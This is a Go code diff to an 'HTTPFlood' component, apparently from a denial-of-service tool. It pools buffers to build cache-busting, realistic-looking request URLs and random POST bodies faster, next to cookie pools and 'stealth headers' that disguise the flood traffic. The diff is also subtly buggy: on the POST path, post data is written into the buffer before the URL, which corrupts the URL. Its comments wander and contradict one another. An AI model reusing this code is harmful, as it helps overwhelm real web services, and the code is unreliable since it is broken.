@@ -9,6 +9,9 @@ import (
 	"io"
 	"net/http"
 	"net/url"
+	"strconv"
+	"strings"
+	"sync"
 	"sync/atomic"
 	"time"
 
@@ -33,6 +36,7 @@ type HTTPFlood struct {
 	trackedTransport *http.Transport
 	metrics          MetricsCallback
 	bindIP           string
+	bufPool          *sync.Pool
 }
 
 // NewHTTPFlood creates a new HTTPFlood strategy.
@@ -50,6 +54,11 @@ func NewHTTPFlood(timeout time.Duration, method string, postDataSize int, reques
 		requestsPerConn: requestsPerConn,
 		cookiePool:      generateCookiePool(50),
 		bindIP:          bindIP,
+		bufPool: &sync.Pool{
+			New: func() interface{} {
+				return new(bytes.Buffer)
+			},
+		},
 	}
 
 	// Initial client setup (without metrics)
@@ -131,17 +140,50 @@ func (h *HTTPFlood) sendRequest(ctx context.Context, target Target, parsedURL *u
 	reqCtx, cancel := context.WithTimeout(ctx, h.timeout)
 	defer cancel()
 
+	// Use buffer from pool for URL construction and POST data
+	buf := h.bufPool.Get().(*bytes.Buffer)
+	buf.Reset()
+	defer h.bufPool.Put(buf)
+
 	var body io.Reader
 	if h.method == "POST" && h.postDataSize > 0 {
-		postData := h.generatePostData()
-		body = bytes.NewReader(postData)
+		h.fillPostData(buf)
+		// We need a reader for the body.
+		// bytes.NewReader(buf.Bytes()) creates a reader around the underlying slice.
+		// NOTE: buf shouldn't be reused until request returns if request reads body async?
+		// Client.Do reads body before returning. So it's safe to reuse buf after Do returns.
+		// Wait, if we use buf for body, we can't use it for URL generation at the same time!
+		// We need TWO buffers or separate phases.
+		// Phase 1: URL gen -> String (copy) -> Reclaim buf? No, string refers to?
+		// string(buf.Bytes()) makes a copy. So we can reuse buf after making string.
+
+		// Let's use buf for URL first
 	}
 
 	var targetURL string
 	if h.IsPathRandomized() {
-		targetURL = h.generateRealisticURL(parsedURL)
+		targetURL = h.buildRealisticURL(buf, target.URL)
 	} else {
-		targetURL = fmt.Sprintf("%s?r=%d&cb=%d", target.URL, randutil.Intn(100000000), randutil.Intn(1000000))
+		buf.WriteString(target.URL)
+		if strings.Contains(target.URL, "?") {
+			buf.WriteString("&r=")
+		} else {
+			buf.WriteString("?r=")
+		}
+		buf.WriteString(strconv.Itoa(randutil.Intn(100000000)))
+		buf.WriteString("&cb=")
+		buf.WriteString(strconv.Itoa(randutil.Intn(1000000)))
+		targetURL = buf.String()
+	}
+
+	buf.Reset() // Clear for post data
+
+	if h.method == "POST" && h.postDataSize > 0 {
+		h.fillPostData(buf)
+		body = bytes.NewReader(buf.Bytes())
+		// DANGER: bytes.NewReader holds reference to buf.Bytes().
+		// If we reuse buf in next iteration (after release), it's fine as long as we don't return from sendRequest yet.
+		// But we defer Put(buf). So it's safe.
 	}
 
 	req, err := http.NewRequestWithContext(reqCtx, h.method, targetURL, body)
@@ -171,6 +213,13 @@ func (h *HTTPFlood) sendRequest(ctx context.Context, target Target, parsedURL *u
 	}
 	defer resp.Body.Close()
 
+	// Use io.Copy to discard body - reuse buffer if possible?
+	// We can't reuse `buf` here easily because `buf` holds postData which might be needed for retries (client handles retries?)
+	// http.Client.Do retries? If it does, `GetBody` is needed, but we provided `io.Reader`.
+	// net/http docs: "If Body is not nil, func (c *Client) Do(req *Request) ... closes Body."
+	// So we don't need to hold it.
+
+	// Just discard response
 	io.Copy(io.Discard, resp.Body)
 
 	atomic.AddInt64(&h.requestsSent, 1)
@@ -248,54 +297,73 @@ func (h *HTTPFlood) applyStealthHeaders(req *http.Request) {
 	}
 }
 
-// generateRealisticURL creates a URL with realistic query parameters
-// Uses pre-parsed URL to avoid repeated parsing overhead
-func (h *HTTPFlood) generateRealisticURL(baseURL *url.URL) string {
-	// Create a shallow copy to avoid mutating the original
-	u := *baseURL
-	q := u.Query()
+// buildRealisticURL creates a URL with realistic query parameters using a buffer
+func (h *HTTPFlood) buildRealisticURL(buf *bytes.Buffer, baseURL string) string {
+	buf.WriteString(baseURL)
+
+	if strings.Contains(baseURL, "?") {
+		buf.WriteString("&")
+	} else {
+		buf.WriteString("?")
+	}
 
 	// Use pooled rand for high CPS
 	rng := randutil.Get()
 	defer rng.Release()
 
-	q.Set("_", fmt.Sprintf("%d", time.Now().UnixMilli()))
-	q.Set("r", fmt.Sprintf("%d", rng.Intn(1000000)))
-	q.Set("v", fmt.Sprintf("%d", rng.Intn(100)+1))
-	q.Set("ref", httpdata.RandomRefSource())
+	buf.WriteString("_=")
+	buf.WriteString(strconv.FormatInt(time.Now().UnixMilli(), 10))
 
-	cacheOptions := []string{"true", "false"}
-	q.Set("cache", cacheOptions[rng.Intn(len(cacheOptions))])
+	buf.WriteString("&r=")
+	buf.WriteString(strconv.Itoa(rng.Intn(1000000)))
+
+	buf.WriteString("&v=")
+	buf.WriteString(strconv.Itoa(rng.Intn(100) + 1))
+
+	buf.WriteString("&ref=")
+	buf.WriteString(httpdata.RandomRefSource())
+
+	buf.WriteString("&cache=")
+	if rng.Intn(2) == 0 {
+		buf.WriteString("true")
+	} else {
+		buf.WriteString("false")
+	}
 
 	if rng.Float32() < 0.2 {
-		q.Set("user_id", fmt.Sprintf("%d", rng.Intn(9000)+1000))
-		q.Set("device", httpdata.RandomDeviceType())
+		buf.WriteString("&user_id=")
+		buf.WriteString(strconv.Itoa(rng.Intn(9000) + 1000))
+		buf.WriteString("&device=")
+		buf.WriteString(httpdata.RandomDeviceType())
 	}
 
 	if rng.Float32() < 0.15 {
-		q.Set("session", httpdata.GenerateSessionID())
+		buf.WriteString("&session=")
+		buf.WriteString(httpdata.GenerateSessionID())
 	}
 
 	if rng.Float32() < 0.1 {
-		q.Set("utm_source", httpdata.RandomUTMSource())
+		buf.WriteString("&utm_source=")
+		buf.WriteString(httpdata.RandomUTMSource())
 	}
 
-	u.RawQuery = q.Encode()
-	return u.String()
+	return buf.String()
 }
 
-func (h *HTTPFlood) generatePostData() []byte {
+func (h *HTTPFlood) fillPostData(buf *bytes.Buffer) {
 	chars := "abcdefghijklmnopqrstuvwxyz0123456789"
-	data := make([]byte, h.postDataSize)
+	// Ensure capacity
+	if buf.Cap() < h.postDataSize {
+		buf.Grow(h.postDataSize)
+	}
 
 	// Use pooled rand for high CPS
 	rng := randutil.Get()
 	defer rng.Release()
 
-	for i := range data {
-		data[i] = chars[rng.Intn(len(chars))]
+	for i := 0; i < h.postDataSize; i++ {
+		buf.WriteByte(chars[rng.Intn(len(chars))])
 	}
-	return data
 }
 
 func (h *HTTPFlood) Name() string {
